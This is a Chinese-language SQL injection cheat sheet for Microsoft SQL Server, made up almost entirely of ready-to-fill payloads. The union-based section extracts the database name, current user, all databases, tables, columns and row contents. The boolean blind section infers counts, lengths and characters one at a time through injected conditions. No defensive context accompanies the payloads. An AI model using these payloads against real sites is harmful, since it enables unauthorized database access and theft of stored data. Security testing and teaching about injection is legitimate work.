### 联合查询注入

#### 判断列数方法

```mssql
UNION ALL SELECT NULL,NULL,NULL
UNION ALL SELECT '1','2','3'
ORDER BY ...
```

#### 获取当前数据库名

```mssql
UNION ALL SELECT NULL,CHAR(60)+CHAR(60)+CHAR(60)+CHAR(60)+CHAR(60)+ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))+CHAR(62)+CHAR(62)+CHAR(62)+CHAR(62)+CHAR(62)
```

#### 获取当前用户名

```mssql
UNION ALL SELECT NULL,NULL,CHAR(60)+CHAR(60)+CHAR(60)+CHAR(60)+CHAR(60)+ISNULL(CAST(SYSTEM_USER AS NVARCHAR(4000)),CHAR(32))+CHAR(62)+CHAR(62)+CHAR(62)+CHAR(62)+CHAR(62)
```

#### 获取所有数据库名

```mssql
UNION ALL SELECT NULL,NULL,CHAR(60)+CHAR(60)+CHAR(60)+CHAR(60)+CHAR(60)+ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32))+CHAR(62)+CHAR(62)+CHAR(62)+CHAR(62)+CHAR(62) FROM master..sysdatabases
```

#### 获取所有表名

```mssql
UNION ALL SELECT NULL,NULL,CHAR(60)+CHAR(60)+CHAR(60)+CHAR(60)+CHAR(60)+ISNULL(CAST(table_schema+CHAR(42)+table_name AS NVARCHAR(4000)),CHAR(32))+CHAR(62)+CHAR(62)+CHAR(62)+CHAR(62)+CHAR(62) FROM information_schema.tables WHERE table_catalog=CHAR(数据库名ascii码)+CHAR(数据库名ascii码)
```

#### 获取所有字段名

```mssql
UNION ALL SELECT NULL,NULL,CHAR(60)+CHAR(60)+CHAR(60)+CHAR(60)+CHAR(60)+ISNULL(CAST(数据库名..syscolumns.name AS NVARCHAR(4000)),CHAR(32))+CHAR(62)+CHAR(62)+CHAR(62)+CHAR(62)+CHAR(62) FROM 数据库名..syscolumns,数据库名..sysobjects WHERE 数据库名..syscolumns.id=数据库名..sysobjects.id AND 数据库名..sysobjects.name=CHAR(表名ASCII码)+CHAR(表名ASCII码)
```

#### 获取数据内容

```mssql
UNION ALL SELECT NULL,NULL,CHAR(60)+CHAR(60)+CHAR(60)+CHAR(60)+CHAR(60)+ISNULL(CAST(字段名 AS NVARCHAR(4000)),CHAR(32))+CHAR(62)+CHAR(62)+CHAR(62)+CHAR(62)+CHAR(62) FROM 数据库名.表名
```

------

### 盲注

#### 1.布尔盲注

##### 判断数据库数量

```mssql
and (select count(*) from master..sysdatabases)=10
```

##### 判断数据库名长度

```mssql
and (select top 1 len(name) from master..sysdatabases where name not in (select top 第x个数据库 name from master..sysdatabases))=长度值
```

##### 判断数据库名

```mssql
and ascii(substring((select top 1 name from master..sysdatabases where name not in (select top 第n个数据库 name from master..sysdatabases)),第x位,1)) = ascii码
```

##### 判断表数量

```mssql
and (select count(*) from bugtest..sysobjects where xtype='U')=5
and (select count(table_name) from information_schema.tables where table_catalog='数据库名')=5
```

##### 判断表名长度

```mssql
and (select top 1 len(name) from 数据库名..sysobjects where xtype='U' and name not in 
(select top 第x个表 name from 数据库名..sysobjects where xtype='U'))=7
```

##### 判断表名

```mssql
and (select substring((select top 1 name from 数据库名..sysobjects where xtype='U'
and name not in (select top 第x个表 name from 数据库名..sysobjects where xtype='U')),第x位,1))=CHAR(ascii码)
```

##### 判断字段数量

```mssql
and (select count(*) from 数据库名..syscolumns where id=object_id('表名'))=3
```

##### 判断字段名长度

```mssql
and (select top 1 len(name) from 数据库名..syscolumns where id=object_id('表名') and name not in (select top 第x个字段 name from 数据库名..syscolumns where id=object_id('表名'))
)=2
```

##### 判断字段名

```mssql
and (select substring((select top 1 name from 数据库名..syscolumns 
where id=object_id('表名') and name not in 
(select top 第x个字段 name from 数据库名..syscolumns where id=object_id('表名'))),第x位,1))=CHAR(ascii码)
```

##### 判断数据数量

```mssql
and (select count(*) from 数据库名..表名) = 2 
```

##### 判断数据长度

```mssql
and (select top 1 len(字段名) from bugtest..content where id not in (select top 第x条数据 id from 数据库名..表名))=5
```

##### 判断数据内容

```mssql
and (select substring((select top 1 CAST(字段名 as char) from content where id not in(select top 0 id from 数据库名..表名)),第x位数据,1))=CHAR(ascii码)
```

